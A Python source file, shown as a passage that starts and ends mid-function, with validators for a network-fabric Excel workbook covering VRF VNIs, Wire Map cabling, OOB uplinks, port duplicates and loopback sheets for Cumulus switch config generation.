                         f"one of the two VRFs disappears from generated config.")
            continue
        seen_vrfs[name_str] = row

        # L3 VNI validity
        l3_vni_raw = ws.cell(row=row, column=3).value
        if l3_vni_raw is None or str(l3_vni_raw).strip() == '':
            result.error("VLANs & Profiles",
                         f"VRFs section row {row} ('{name_str}'): L3 VNI is "
                         f"blank. Generated config will be missing the "
                         f"`nv set vrf {name_str} evpn vni …` line.")
            continue
        if isinstance(l3_vni_raw, bool) or not isinstance(l3_vni_raw, int):
            try:
                l3_vni = int(str(l3_vni_raw).strip())
            except (TypeError, ValueError):
                result.error("VLANs & Profiles",
                             f"VRFs section row {row} ('{name_str}'): L3 VNI "
                             f"'{l3_vni_raw}' must be a positive integer. "
                             f"The parser will crash with a Python traceback "
                             f"at generate time.")
                continue
        else:
            l3_vni = l3_vni_raw
        if l3_vni <= 0:
            result.error("VLANs & Profiles",
                         f"VRFs section row {row} ('{name_str}'): L3 VNI "
                         f"must be positive (got {l3_vni}). Zero or negative "
                         f"values are silently dropped by the parser.")
            continue
        # R3-1: L3 VNI uniqueness across VRFs. Cumulus rejects duplicate
        # L3 VNIs at apply time. Catch here.
        for existing_name, (existing_vni, existing_row) in vrf_l3_vnis.items():
            if existing_vni == l3_vni:
                result.error("VLANs & Profiles",
                             f"VRFs section row {row} ('{name_str}'): L3 VNI "
                             f"{l3_vni} collides with VRF '{existing_name}' "
                             f"(row {existing_row}). Each VRF must have a "
                             f"unique L3 VNI.")
        vrf_l3_vnis[name_str] = (l3_vni, row)


    # R3-2: cross-check VLAN.vrf references VRFs that exist in this section.
    declared_vrfs = set(seen_vrfs.keys())
    # Case-folded → canonical-spelling map for "did you mean?" hints.
    # R4-04 / R4-19: parser is case-sensitive when emitting `nv set vrf X` vs
    # `nv set interface vlanN ip vrf X`; spelling mismatches deploy as broken.
    declared_vrfs_ci = {n.lower(): n for n in declared_vrfs}
    # Standard VRFs always available regardless of explicit declaration
    builtin_vrfs = {'default', ''}
    for v in parsed_vlans:
        vlan_vrf = (v.get('vrf') or '').strip()
        if not vlan_vrf:
            continue
        if (vlan_vrf not in declared_vrfs
                and vlan_vrf.lower() not in builtin_vrfs):
            # Case-mismatch hint
            hint = ""
            if vlan_vrf.lower() in declared_vrfs_ci:
                canonical = declared_vrfs_ci[vlan_vrf.lower()]
                hint = (f" Did you mean '{canonical}'? Cumulus matches VRF names "
                        f"case-sensitively at apply time.")
            result.error("VLANs & Profiles",
                         f"VLAN {v['id']} '{v['name']}' (row {v['row']}) "
                         f"references VRF '{vlan_vrf}' which is not defined "
                         f"in the VRFs section. Generator emits config "
                         f"referencing a nonexistent VRF.{hint}")

    # NOT IMPLEMENTED: cross-check of L3 VNIs against VLAN VNIs. `parsed_vlans`
    # dicts from validate_vlans do not carry the VNI, so the comparison needs a
    # re-read of the sheet. Previously this was a `for` loop whose body was
    # `pass`, under a heading that made it read as an implemented rule.
    # Removed rather than left as a stub — an empty loop under a promising
    # heading is worse than a documented gap.

    return vrf_l3_vnis


def validate_wire_map(ws, result, sheet_name="Wire Map", nodes_function_map=None,
                      parsed_nodes=None):
    """Validate Wire Map sheet: port formats and duplicate detection.

    Returns the set of (switch_role, switch_port) assignments for
    cross-sheet duplicate checking.

    When `parsed_nodes` is provided, additionally checks:
      - System Name (B) (the peer/switch side) references a host on the Nodes tab
      - A-side and B-side names aren't identical (self-loop catch)
    """
    # Build the set of known node names + Air virtual nodes for B-side
    # cross-check. Empty when parsed_nodes is None (legacy callers).
    known_hosts = set()
    if parsed_nodes:
        for n in parsed_nodes:
            name = (n.get('name') or '').strip()
            if name:
                known_hosts.add(name)
        # Air virtual nodes are auto-created by the topology generator
        # and not listed on the Nodes tab; treat them as valid B-side
        # references when they appear in a Wire Map row.
        known_hosts.update({'dhcp-oob', 'oob-server-01', 'dhcp-edge',
                             'air-oob-switch'})
        # The literal "outbound" sentinel marks links going to the
        # internet/customer-edge (used by topology generator).
        known_hosts.add('outbound')

    # Sentinel B-side values that aren't hostnames — operators use them
    # to mark spare/unused links. The topology generator ignores rows
    # with these B-side values.
    _BSIDE_SENTINEL_PATTERNS = (
        re.compile(r'^spare\b', re.IGNORECASE),       # "SPARE ISL", "SPARE-1"
        re.compile(r'^cust[-_]?net[-_]?edge[-_]?\d+$', re.IGNORECASE),  # cust-net-edge-NN
        # STORAGE VRF design: ext-* names mark external gear cabled into the
        # fabric but not ZTP-managed (storage arrays, etc.). Same intent as
        # cust-net-edge — operator doesn't have to add a Nodes row to silence
        # the warning. See docs/plans/2026-05-19-storage-vrf-design.md.
        re.compile(r'^ext[-_]', re.IGNORECASE),       # "ext-storage-01", "ext-fw-02"
    )
    is_air_only = (sheet_name == "Air_Only")
    sheet_kind = 'air_only' if is_air_only else 'wiremap'

    # Header-name-based column lookup with required-column enforcement.
    # Wire Map: must have the required columns → error if not.
    # Air_Only: the sheet is also used as a metadata side-table
    # (version-image map, Air mgmt subnet, etc.) on some Excels where
    # no actual connection rows are listed. If required columns are
    # missing here, treat as "no rows to validate" rather than fail.
    try:
        col_map = build_wiremap_column_map(ws, sheet_kind=sheet_kind)
    except ValueError as exc:
        if is_air_only:
            return {}  # metadata-only Air_Only sheet — nothing to validate
        result.error(sheet_name, str(exc))
        return {}

    sys_role_col = col_map.get('system_role')
    sys_name_col = col_map.get('system_name')
    profile_col  = col_map.get('network_profile')
    sw_role_col  = col_map.get('switch_role')
    sw_name_col  = col_map.get('switch_name')
    sw_port_col  = col_map.get('switch_port')

    # Track (switch_role, switch_port) assignments
    port_assignments = defaultdict(list)
    # Track (system_role, nic_port) for source-side duplicates
    source_assignments = defaultdict(list)
    row_count = 0
    # Per-skip-reason counters for the post-loop diagnostic summary.
    skip_reasons = defaultdict(int)

    for row in range(2, ws.max_row + 1):
        sys_role = _cell(ws, row, sys_role_col)  # may be None (optional col)
        sys_name_raw_loc = _cell(ws, row, sys_name_col)
        sys_role_str = str(sys_role).strip() if sys_role else ''
        sys_name_str = str(sys_name_raw_loc).strip() if sys_name_raw_loc else ''
        # Skip spacer rows: both A-side identifiers blank.
        if not sys_role_str and not sys_name_str:
            skip_reasons['spacer (no A-side identity)'] += 1
            continue

        row_count += 1
        # Fall back to role when name is blank (legacy hostname-as-role).
        if not sys_name_str:
            sys_name_str = sys_role_str

        # Wire Map ↔ Nodes Function disagreement check.
        # If Nodes tab classifies this hostname as one role but the Wire Map
        # row holds a different role string, surface as a warning — almost
        # always a stale row or a typo. Compare canonically so legacy
        # hostname-as-role ('csl-01') matches canonical ('csl').
        if nodes_function_map and sys_name_str in nodes_function_map:
            nodes_func = nodes_function_map[sys_name_str]
            # Only flag a disagreement when the Wire Map row EXPLICITLY states a
            # System Role. A blank role asserts nothing — inferring one from the
            # hostname produced false positives once tier-aware names landed
            # (host 'cl-01' name-infers to 'csl' while its Function is correctly
            # 'cl'). Canonicalize both stated sides so e.g. wiremap 'gsl-plane1'
            # vs Function 'csl' still differs and warns.
            wm_canon = canonical_category(sys_role_str, None) if sys_role_str else ''
            nodes_canon = canonical_category(nodes_func, sys_name_str)
            if wm_canon and nodes_canon and wm_canon != nodes_canon:
                result.warn(sheet_name,
                            f"Row {row}: System Role '{sys_role_str}' (canonical "
                            f"'{wm_canon}') disagrees with Nodes tab Function "
                            f"'{nodes_func}' (canonical '{nodes_canon}') for hostname "
                            f"'{sys_name_str}'. Nodes tab is authoritative — fix the "
                            f"Wire Map row or update Nodes.")
        sw_role = _cell(ws, row, sw_role_col)  # may be None (optional col)
        sw_name = _cell(ws, row, sw_name_col)
        sw_port = _cell(ws, row, sw_port_col)

        sw_role_str = str(sw_role).strip() if sw_role else ''
        sw_name_str = str(sw_name).strip() if sw_name else sw_role_str
        sw_port_str = str(sw_port).strip() if sw_port else ''

        # Need a peer identity AND a peer port to count this as an
        # assignment. Function (B) is optional; System Name (B) + Port (B)
        # are the load-bearing cells.
        if not sw_name_str or not sw_port_str:
            skip_reasons['no peer (B-side name or port blank)'] += 1
            continue

        # Skip "outbound" links (virtual, no physical port)
        if sw_role_str.lower() == 'outbound' or sw_name_str.lower() == 'outbound':
            skip_reasons['outbound link'] += 1
            continue

        # Gate: an OOB uplink (oob-switch <-> core/CSL) must terminate on an
        # SN2201 QSFP28 uplink port (swp49-52), never a copper host port
        # (swp1-48). The OOB template makes swp1-48 L2 bridge access ports at
        # 1G (excel_parser bridge_nums = range(1,49)) while the parser also
        # emits the uplink port as an L3 unnumbered eBGP neighbor. On swp1-48
        # the port gets BOTH — and a bridged 1G access port can't run
        # unnumbered eBGP, so the OOB<->CSL underlay (and the EVPN overlay
        # riding over it) never comes up. swp49-52 sit outside the bridge
        # range and render as clean routed interfaces. Root-caused on the
        # a live 2-8-9-800 site. See test_validate_oob_uplink_port.py and
        # docs/internal/adr/0025-oob-uplinks-on-sn2201-qsfp28-ports.md.
        profile_val = _cell(ws, row, profile_col) if profile_col else None
        profile_str = str(profile_val).strip().lower() if profile_val else ''
        a_is_oob = 'oob-switch' in sys_name_str.lower()
        b_is_oob = 'oob-switch' in sw_name_str.lower()
        if (a_is_oob or b_is_oob) and (
                ('oob' in profile_str and 'uplink' in profile_str)
                or ('sn2201' in profile_str)
                or ('uplink' in profile_str)):
            if b_is_oob:
                oob_name, oob_port_str = sw_name_str, sw_port_str
            else:
                a_port_raw = _cell(ws, row, col_map.get('nic_port'))
                oob_name = sys_name_str
                oob_port_str = str(a_port_raw).strip() if a_port_raw else ''
            m_oob = SWP_PORT_RE.match(oob_port_str)
            if m_oob and int(m_oob.group(1)) <= 48:
                result.error(sheet_name,
                             f"Row {row}: OOB uplink terminates on {oob_name} "
                             f"{oob_port_str}, a copper host port (swp1-48). SN2201 "
                             f"copper ports are L2 1G bridge access ports and can't "
                             f"run the L3 unnumbered eBGP underlay — OOB<->CSL BGP "
                             f"will not come up. Move the uplink to a QSFP28 uplink "
                             f"port (swp49-52).")

        # Sentinel detection: skip self-loop + B-side checks when both
        # sides are sentinel names (e.g. SPARE ISL marking unused links).
        _is_sentinel = lambda name: any(
            pat.match(name) for pat in _BSIDE_SENTINEL_PATTERNS)
        sys_is_sentinel = _is_sentinel(sys_name_str) if sys_name_str else False
        sw_is_sentinel = _is_sentinel(sw_name_str) if sw_name_str else False

        # Self-loop: A side and B side are the same real host. Topology
        # generator would emit a real self-link which Air can't instantiate.
        # Skip when both sides are sentinels (e.g. SPARE ISL on both sides).
        if (sys_name_str and sw_name_str
                and sys_name_str.lower() == sw_name_str.lower()
                and not (sys_is_sentinel and sw_is_sentinel)):
            result.error(sheet_name,
                         f"Row {row}: self-loop — System Name (A) and "
                         f"System Name (B) are both '{sys_name_str}'. "
                         f"Two ports on the same device can't cable to each other.")

        # B-side host should exist on the Nodes tab (or match a known
        # sentinel pattern). Emit as warning since some defaults reference
        # external devices (storage arrays, customer-edge switches) that
        # are intentionally absent from Nodes.
        if known_hosts and sw_name_str and sw_name_str not in known_hosts:
            if sw_name_str.lower() not in {h.lower() for h in known_hosts}:
                if not sw_is_sentinel:
                    # R4-03: explain what the symptom is. Operator who
                    # renames a host in Nodes but forgets to update the
                    # Wire Map B-side gets switch configs cabled to the
                    # OLD name (no inventory, no DHCP, no ZTP) while
                    # inventory has the NEW name. Two different host
                    # names in two different artifacts, no error.
                    result.warn(sheet_name,
                                f"Row {row}: System Name (B) '{sw_name_str}' is not "
                                f"listed in the Nodes tab. Switch configs will still "
                                f"cable the port to this name (intentional — supports "
                                f"config-rehearsal for not-yet-installed hardware and "
                                f"external devices like storage arrays). If this is a "
                                f"typo though, fix the hostname; otherwise add a Nodes "
                                f"row for it (Enabled=No is fine).")

        # Validate switch port format
        if not PORT_RE.match(sw_port_str):
            # Allow integer-only port numbers (some sheets use just numbers)
            try:
                int(sw_port_str)
            except ValueError:
                result.warn(sheet_name, f"Row {row}: Unusual switch port format: '{sw_port_str}' on {sw_role_str}")
        else:
            # Port number bounds check. Cumulus port count varies by
            # switch model (SN5610 = 64 ports, SN2201 = 52 ports incl.
            # uplinks). Without per-row model lookup, just upper-bound
            # at 64 — anything beyond is a clear typo (`swp999` etc.)
            m_port = re.match(r'^swp(\d+)', sw_port_str)
            if m_port and int(m_port.group(1)) > 64:
                result.error(sheet_name,
                             f"Row {row}: Switch Port '{sw_port_str}' has port "
                             f"number {m_port.group(1)} > 64 (no Cumulus model in "
                             f"this lineup exceeds 64 base ports). Likely a typo.")

        # Track for duplicate detection — key on switch NAME (col 12) rather
        # than role, so canonical-role inputs (e.g. multiple oob-switch rows
        # all having sw_role='oob-switch') don't collapse into one bucket.
        port_assignments[(sw_name_str, sw_port_str)].append((row, sys_name_str or sys_role_str))

        # Source-side: track NIC/Port per system, factoring in Port Side (A).
        # Dual-plane breakouts legitimately list the same NIC twice — once for
        # side 1 (→ plane1) and once for side 2 (→ plane2). Including the
        # port-side in the key avoids false-positive duplicate warnings.
        if not is_air_only:
            # Read NIC/Port and Port Side via the column map (no
            # hardcoded indices — works after the operator deletes,
            # reorders, or renames any Wire Map column).
            nic_port = _cell(ws, row, col_map.get('nic_port'))
            if nic_port and str(nic_port).strip():
                nic_str = str(nic_port).strip()
                port_side_raw = _cell(ws, row, col_map.get('port_side'))
                port_side = str(port_side_raw).strip() if port_side_raw else ""
                # Source-dedup key must use the per-host System Name,
                # not System Role. Otherwise every "compute eth0" row
                # collides with every other compute host using literal eth0.
                sys_name_key = sys_name_str or sys_role_str
                source_assignments[(sys_name_key, nic_str, port_side)].append((row, sw_role_str, sw_port_str))

    # Report duplicate switch ports (same switch, same port, different rows)
    dup_count = 0
    for (sw_name_key, sw_port), entries in port_assignments.items():
        if len(entries) > 1:
            dup_count += 1
            detail = "; ".join(f"row {r} ({sys})" for r, sys in entries)
            result.error(sheet_name, f"Duplicate switch port: {sw_name_key} {sw_port} used {len(entries)} times — {detail}")

    # Report duplicate source ports (same system + NIC + port-side, different rows)
    # This is a warning, not an error — dual-homed OOB (same NIC to two
    # switches) is a legitimate pattern in ERA architectures.
    for (sys_role, nic_port, port_side), entries in source_assignments.items():
        if len(entries) > 1:
            detail = "; ".join(f"row {r} → {sw}:{sp}" for r, sw, sp in entries)
            side_note = f" [side {port_side}]" if port_side else ""
            result.warn(sheet_name, f"Source port used multiple times: {sys_role} {nic_port}{side_note} ({len(entries)}x) — {detail}")

    # Stricter cross-check on top of the per-side bucket above. The same
    # physical (sys_name, nic_port) can legitimately appear in multiple
    # rows in two patterns:
    #   (a) dual-homed OOB — same empty/NA Port Side (A) on every row.
    #       Caught by the warning loop above when port_side keys match.
    #   (b) dual-plane breakout — distinct non-NA Port Side (A) per row
    #       (e.g. "A" + "B"). Per-side key puts these in separate buckets,
    #       so neither check above warns. Intentional.
    # Anything else — mixing NA with a side, or two rows sharing a
    # non-NA side — is a mis-edited duplicate that slips through the
    # per-side key. Surface it explicitly here.
    physical_port_buckets: dict = defaultdict(list)
    for (sys_name, nic_port, port_side), entries in source_assignments.items():
        for row, sw_role, sw_port in entries:
            physical_port_buckets[(sys_name, nic_port)].append(
                (row, port_side, sw_role, sw_port)
            )

    for (sys_name, nic_port), rows in physical_port_buckets.items():
        if len(rows) <= 1:
            continue
        sides = [s for _, s, *_ in rows]
        side_set = set(sides)
        if len(side_set) == 1:
            # All rows share one side label — that's pattern (a), already
            # surfaced by the warning loop. Don't double-report here.
            continue
        # Sides differ across rows. Pattern (b) requires every side
        # distinct AND none NA/empty.
        distinct_sides = len(side_set) == len(sides)
        has_na = any((not s) or s.strip().upper() == "NA" for s in sides)
        if has_na or not distinct_sides:
            detail = "; ".join(
                f"row {r} side='{s or 'NA'}' → {sw}:{sp}"
                for r, s, sw, sp in rows
            )
            result.error(
                sheet_name,
                f"Physical port reused with conflicting Port Side (A) "
                f"annotations: {sys_name} {nic_port} appears in {len(rows)} "
                f"rows — {detail}. Same physical port can't be cabled twice. "
                f"If this is a breakout, every row needs a distinct non-NA "
                f"Port Side (A) value."
            )

    if row_count == 0:
        result.warn(sheet_name, "No data rows found")

    # Wrap the assignments in a thin object so the caller can read the
    # diagnostic counters without changing the existing `len()` semantics.
    class _WireMapResult(dict):
        pass
    out = _WireMapResult(port_assignments)
    out.skip_reasons = dict(skip_reasons)
    out.duplicate_count = dup_count
    return out


def _validate_oob_cabling(ws, parsed_nodes, result, nodes_function_map=None):
    """Verify every non-switch host has at least one Wire Map row cabling it
    to an OOB switch with a populated peer port.

    Without this, the deploy will boot the host but eth0 stays
    unconfigured (no OOB switch port to dnsmasq for the DHCP reservation,
    no Air cable to wire eth0). Symptom: validate-servers reports the
    host as UNREACHABLE. This check catches that before deploy.
    """
    try:
        col_map = build_wiremap_column_map(ws, sheet_kind='wiremap')
    except ValueError:
        return  # required columns missing — already reported elsewhere

    # Build {host: [list of (row, display, peer_role_canon, peer_name, peer_port)]} for OOB-classified rows.
    oob_rows = {}
    for r in range(2, ws.max_row + 1):
        # System Name (A) is preferred; legacy canonicals leave it blank and
        # keep the hostname in Function (A) — fall back to that.
        sys_name = _cell(ws, r, col_map.get('system_name'))
        if not sys_name:
            sys_name = _cell(ws, r, col_map.get('system_role'))
        if sys_name is None:
            continue
        sys_name = str(sys_name).strip()
        if not sys_name:
            continue
        profile = _cell(ws, r, col_map.get('network_profile'))
        profile_lc = str(profile).strip().lower() if profile else ''
        # Only consider OOB/IPMI-classified rows (the host's mgmt cabling).
        if not ('oob' in profile_lc or 'ipmi' in profile_lc or 'mgmt' in profile_lc
                or 'management' in profile_lc):
            continue
        disp = _cell(ws, r, col_map.get('display_in_air'))
        display_yes = str(disp).strip().lower() == 'yes' if disp else False
        peer_role = _cell(ws, r, col_map.get('switch_role')) or ''
        peer_name = _cell(ws, r, col_map.get('switch_name')) or peer_role
        peer_port = _cell(ws, r, col_map.get('switch_port'))
        # Cascade through the Nodes-tab Function column when the Wire Map
        # B-side Function is blank and the hostname isn't canonical
        # (e.g. OEM names like 'mdf-c09r31-2894-oob-1'). Mirrors the same
        # cascade we already do in parse_core_port_config and
        # _build_wiremap_row_list.
        peer_role_for_canon = str(peer_role).strip()
        peer_name_str = str(peer_name).strip() if peer_name else ''
        if not peer_role_for_canon and peer_name_str and nodes_function_map:
            peer_role_for_canon = nodes_function_map.get(peer_name_str, '')
        peer_role_canon = canonical_category(peer_role_for_canon,
                                             peer_name_str or None)
        oob_rows.setdefault(sys_name, []).append(
            (r, display_yes,
             peer_role_canon,
             peer_name_str,
             str(peer_port).strip() if peer_port else ''))

    # Hosts that need cabling: every non-switch on Nodes (excluding Air virtuals).
    AIR_VIRTUAL = {'dhcp-oob', 'oob-server-01', 'dhcp-edge', 'air-oob-switch'}
    missing = []
    incomplete = []
    for n in parsed_nodes:
        name = (n.get('name') or '').strip()
        if not name or name in AIR_VIRTUAL:
            continue
        if not n.get('enabled', True):
            continue  # operator marked this node disabled — won't be deployed
        if n.get('is_air_documentary'):
            continue  # Enabled=Air: documents auto-injected infra, not a
                      # real host needing OOB cabling
        func = canonical_category(n.get('function'), name)
        if func in ('core', 'csl', 'gsl', 'gsl-plane1', 'gsl-plane2',
                    'oob-switch', 'oob-server', 'edge', 'air-oob', 'dhcp',
                    'ext-storage'):
            continue  # switches and infrastructure don't need OOB host cabling
                      # (ext-storage = customer-side simulated aggregate, also OOB-free)
        rows = oob_rows.get(name, [])
        # Need at least one row that is BOTH display=Yes AND has a valid OOB peer + port.
        valid = [r for r in rows
                 if r[1] and r[2] == 'oob-switch' and r[3] and r[4]]
        if not valid:
            # Distinguish "no rows at all" from "rows exist but blank port"
            partial = [r for r in rows if r[2] == 'oob-switch' and not r[4]]
            if rows and partial:
                incomplete.append((name, partial))
            else:
                missing.append(name)

    if missing:
        result.error("Wire Map",
                     f"{len(missing)} host(s) have NO OOB management cabling — "
                     f"these will be unreachable on eth0 after deploy: "
                     f"{', '.join(missing[:10])}"
                     + (f', ... ({len(missing)} total)' if len(missing) > 10 else ''))
    if incomplete:
        # Show specific rows with blank Port (B) — the most common failure
        # mode (operator started filling but didn't finish).
        sample = []
        for host, rows_blank in incomplete[:6]:
            row_nums = sorted(r[0] for r in rows_blank)[:4]
            sample.append(f"{host} (rows {row_nums})")
        result.error("Wire Map",
                     f"{len(incomplete)} host(s) have OOB rows pointing at an OOB switch "
                     f"but with blank Port (B) — eth0 won't be cabled: "
                     + '; '.join(sample)
                     + (f'; ... ({len(incomplete)} total)' if len(incomplete) > 6 else ''))


def _validate_oob_switch_air_capacity(ws, result):
    """Verify each OOB switch has at least one spare swp port for the
    air-oob-switch backdoor that the topology generator auto-injects.

    SN2201 has 52 swp ports total (swp1-48 host + swp49-52 uplinks).
    At generate-time, topology_generator picks the first unused port in
    1..52 for the OOB-switch → air-oob-switch data-plane link (the
    management eth0 link is separate and doesn't consume a swp port).

    If every swp port is already consumed by wiremap rows + spine_bond
    uplinks, the auto-injection silently double-books a port. Catch
    that here.
    """
    try:
        col_map = build_wiremap_column_map(ws, sheet_kind='wiremap')
    except ValueError:
        return  # required columns missing — already reported elsewhere

    # Per-switch: {oob_switch_name: set_of_used_port_nums}
    used: dict = {}
    swp_re = re.compile(r'^swp(\d+)(?:s\d+)?$')
    for r in range(2, ws.max_row + 1):
        disp = _cell(ws, r, col_map.get('display_in_air'))
        if str(disp or '').strip().lower() != 'yes':
            continue
        # Case 1: OOB switch is the B-side peer (typical host → oob row).
        peer_role = _cell(ws, r, col_map.get('switch_role')) or ''
        peer_name = _cell(ws, r, col_map.get('switch_name')) or peer_role
        peer_port = _cell(ws, r, col_map.get('switch_port'))
        peer_role_canon = canonical_category(str(peer_role).strip(),
                                             str(peer_name).strip() if peer_name else None)
        if peer_role_canon == 'oob-switch' and peer_name and peer_port:
            m = swp_re.match(str(peer_port).strip())
            if m:
                used.setdefault(str(peer_name).strip(), set()).add(int(m.group(1)))
        # Case 2: OOB switch is the A-side (oob → core uplink rows in the
        # 2-8-9-800 layout). Source port is in nic_port.
        sys_role = _cell(ws, r, col_map.get('system_role')) or ''
        sys_name = _cell(ws, r, col_map.get('system_name')) or sys_role
        sys_port = _cell(ws, r, col_map.get('nic_port'))
        sys_role_canon = canonical_category(str(sys_role).strip(),
                                            str(sys_name).strip() if sys_name else None)
        if sys_role_canon == 'oob-switch' and sys_name and sys_port:
            m = swp_re.match(str(sys_port).strip())
            if m:
                used.setdefault(str(sys_name).strip(), set()).add(int(m.group(1)))

    TOTAL_PORTS = 52  # SN2201
    BACKDOOR_PORTS_NEEDED = 1  # one swpN for the air-oob data plane
    WARN_CUSHION = 3  # warn if free <= cushion (regardless of need)

    for sw in sorted(used):
        used_count = len(used[sw])
        free = TOTAL_PORTS - used_count
        if free < BACKDOOR_PORTS_NEEDED:
            result.error("Wire Map",
                         f"{sw}: {used_count}/{TOTAL_PORTS} ports consumed — "
                         f"no spare port left for the auto-injected "
                         f"air-oob-switch data-plane link. Free up at least one "
                         f"swp port on this switch or the Air sim won't have "
                         f"a path from dhcp-oob to the hosts behind it.")
        elif free <= WARN_CUSHION:
            result.warn("Wire Map",
                        f"{sw}: {used_count}/{TOTAL_PORTS} ports consumed — "
                        f"only {free} swp port(s) free for the air-oob-switch "
                        f"backdoor. Tight; consider trimming redundant rows "
                        f"before more wiring lands.")


_PLANE_HOSTNAME_RE = re.compile(r'-plane(\d+)(?:-|$)')
_PLANE_VLAN_NAME_RE = re.compile(r'^gpu_plane(\d+)$', re.IGNORECASE)
_RAIL_VLAN_NAME_RE = re.compile(r'^gpu_rail(\d+)$', re.IGNORECASE)
_RAIL_PLANE_VLAN_NAME_RE = re.compile(r'^gpu_rail(\d+)_plane(\d+)$', re.IGNORECASE)
_RAIL_PROFILE_RE = re.compile(
    r'^gpu[\s_-]*rail[\s_-]*(\d+)$',
    re.IGNORECASE,
)
_RAIL_PLANE_PROFILE_RE = re.compile(
    r'^gpu[\s_-]*rail[\s_-]*(\d+)[\s_-]*plane[\s_-]*(\d+)$',
    re.IGNORECASE,
)


def _planes_referenced_in_wire_map(wb):
    """Walk Wire Map (and Air_Only) collecting planes mentioned in switch
    hostnames, plus a per-plane NIC count for capacity checks.

    Uses header-name-based column lookup (not hardcoded indices) so the
    check still works on Excels where the optional `Function (A)` /
    `Function (B)` columns have been deleted — without that, the
    System Name column shifts left and the hardcoded read picked up a
    different column entirely, falsely reporting no plane references.
    """
    planes = set()
    nic_count = {}
    for sheet_name, sheet_kind in (('Wire Map', 'wiremap'), ('Air_Only', 'air_only')):
        if sheet_name not in wb.sheetnames:
            continue
        ws = wb[sheet_name]
        try:
            col_map = build_wiremap_column_map(ws, sheet_kind=sheet_kind)
        except ValueError:
            continue  # required columns missing — reported elsewhere
        switch_name_col = col_map.get('switch_name')
        if not switch_name_col:
            continue
        for row in range(2, ws.max_row + 1):
            sw_name = ws.cell(row, switch_name_col).value
            if not sw_name:
                continue
            m = _PLANE_HOSTNAME_RE.search(str(sw_name))
            if not m:
                continue
            plane = f'plane{m.group(1)}'
            planes.add(plane)
            nic_count[plane] = nic_count.get(plane, 0) + 1
    return planes, nic_count


def _rail_planes_referenced_in_wire_map(wb):
    """Return GPU interface counts keyed by (plane, rail).

    This is intentionally based on Wire Map Network Profile values such as
    `GPU Rail 3 Plane 2`. Counting all rows whose switch hostname includes
    `-planeN-` is too broad for rail capacity because it includes spine/ISL
    rows and treats one rail subnet as if it must hold the whole plane.
    """
    counts = {}
    for sheet_name, sheet_kind in (('Wire Map', 'wiremap'), ('Air_Only', 'air_only')):
        if sheet_name not in wb.sheetnames:
            continue
        ws = wb[sheet_name]
        try:
            col_map = build_wiremap_column_map(ws, sheet_kind=sheet_kind)
        except ValueError:
            continue
        profile_col = col_map.get('network_profile')
        if not profile_col:
            continue
        for row in range(2, ws.max_row + 1):
            profile = ws.cell(row, profile_col).value
            if not profile:
                continue
            match = _RAIL_PLANE_PROFILE_RE.match(str(profile).strip())
            if not match:
                continue
            rail = int(match.group(1))
            plane = f'plane{int(match.group(2))}'
            counts[(plane, rail)] = counts.get((plane, rail), 0) + 1
    return counts


def _rails_referenced_in_wire_map(wb):
    """Return GPU interface counts keyed by rail for single-plane per-rail mode."""
    counts = {}
    for sheet_name, sheet_kind in (('Wire Map', 'wiremap'), ('Air_Only', 'air_only')):
        if sheet_name not in wb.sheetnames:
            continue
        ws = wb[sheet_name]
        try:
            col_map = build_wiremap_column_map(ws, sheet_kind=sheet_kind)
        except ValueError:
            continue
        profile_col = col_map.get('network_profile')
        if not profile_col:
            continue
        for row in range(2, ws.max_row + 1):
            profile = ws.cell(row, profile_col).value
            if not profile:
                continue
            match = _RAIL_PROFILE_RE.match(str(profile).strip())
            if not match:
                continue
            rail = int(match.group(1))
            counts[rail] = counts.get(rail, 0) + 1
    return counts


_LOOPBACK_VRFS = ('OOB', 'INBAND', 'EXIT', 'GPU', 'STORAGE')


def _classify_loopback_header_v(header_text):
    """Return (kind, vrf) for a Loopbacks-sheet header.

    kind ∈ {'switch', 'lo', 'vrf', None}; vrf is one of _LOOPBACK_VRFS
    when kind == 'vrf', else None.
    """
    if header_text is None:
        return None, None
    key = str(header_text).strip().lower()
    if not key:
        return None, None
    if key in ('switch', 'switch name', 'hostname'):
        return 'switch', None
    if key in ('default', 'default (lo)', 'lo', 'lo_ip', 'underlay', 'loopback'):
        return 'lo', None
    if key in ('asn', 'as', 'bgp asn', 'bgp_asn', 'autonomous system', 'as number'):
        return 'asn', None
    for vrf in _LOOPBACK_VRFS:
        v = vrf.lower()
        if key == v or key == f'{v} vrf':
            return 'vrf', vrf
    if key == 'in-band':
        return 'vrf', 'INBAND'
    return None, None


def _subnet_contains(cidr, ip):
    """True if ip (string) is inside cidr (e.g. '10.0.0.0/24'). Best-effort,
    accepts plain ip or 'ip/mask'. Returns False on parse failure."""
    try:
        import ipaddress
        net = ipaddress.ip_network(cidr.strip(), strict=False)
        addr = ipaddress.ip_address(ip.split('/')[0].strip())
        return addr in net
    except Exception:
        return False


def loopbacks_asn_populated(wb):
    """True if the workbook's Loopbacks sheet has an ASN column with at least one
    populated value."""
    _name = loopbacks_sheet_name(wb)
    if not _name:
        return False
    ws = wb[_name]
    hr = next((r for r in range(1, min(ws.max_row + 1, 5))
               if str(ws.cell(r, 1).value or '').strip().lower().startswith('switch')), None)
    if not hr:
        return False
    acol = next((c for c in range(1, ws.max_column + 1)
                 if _classify_loopback_header_v(ws.cell(hr, c).value)[0] == 'asn'), None)
    if not acol:
        return False
    return any(ws.cell(r, acol).value not in (None, '')
               for r in range(hr + 1, ws.max_row + 1))


def validate_loopbacks(ws, parsed_nodes, parsed_vlans, settings, result):
    """Validate the optional Loopbacks sheet — per-switch / per-VRF overrides.

    Schema: Switch | Default | OOB | INBAND | EXIT | GPU | ASN. Missing cells
    fall back to the parser's computed defaults; the validator runs only when
    the sheet IS present. The optional ASN column sets a per-node BGP
    ASN; shared groups must stay uniform and every group distinct.

    Checks:
      - Header row has a 'Switch' column.
      - Unknown column headers are warned and ignored.
      - Every populated IP/CIDR parses as a valid IPv4 address.
      - Switch name cross-references the Nodes tab (warn on unknowns).
      - No two switches share the same Default or VRF loopback (error).
      - No loopback IP falls inside a VLAN subnet owned by a different
        VRF (error). A GPU VRF loopback inside the GPU VLAN subnet is
        allowed because our tool generates exactly that by default.
      - Default IPs are warned if outside Settings.loopback_base (one
        warning per divergent /24; dual-plane archs intentionally
        diverge).
    """
    header_row = None
    for r in range(1, min(ws.max_row + 1, 5)):
        v = ws.cell(row=r, column=1).value
        if v and str(v).strip().lower().startswith('switch'):
            header_row = r
            break
    if header_row is None:
        result.error("Loopbacks", "Could not find a header row starting with 'Switch'")
        return

    col_switch = None
    col_lo = None
    col_asn = None
    vrf_cols = {}  # vrf -> col_idx
    for c in range(1, ws.max_column + 1):
        v = ws.cell(row=header_row, column=c).value
        if v is None:
            continue
